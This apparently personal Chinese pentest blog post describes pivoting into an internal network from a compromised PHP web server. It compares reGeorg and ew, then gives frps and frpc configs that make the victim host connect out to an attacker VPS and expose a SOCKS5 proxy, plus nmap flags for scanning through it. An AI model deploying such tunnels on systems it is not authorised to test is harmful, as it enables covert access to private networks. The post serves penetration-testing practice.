Title: frps的socks5代理
Category: Pentest
slug: frps
Date: 2019-05-08


在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。

首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass

其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass

最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:



```
frps.ini: 

[common]
bind_port = 10086
privilege_token = [passwd]
max_pool_count = 50
dashboard_port = [port]
dashboard_user = [user]
dashboard_pwd = [password]
use_encryption = true
use_compression = true
```

上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活

```
frpc.ini

[common]
server_addr = [vps ip]
server_port = 10086
privilege_token = [passwd]
max_pool_count = 50


[socks5]
type = tcp
remote_port = [port]
plugin = socks5
```
这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上`-sT -Pn`选项。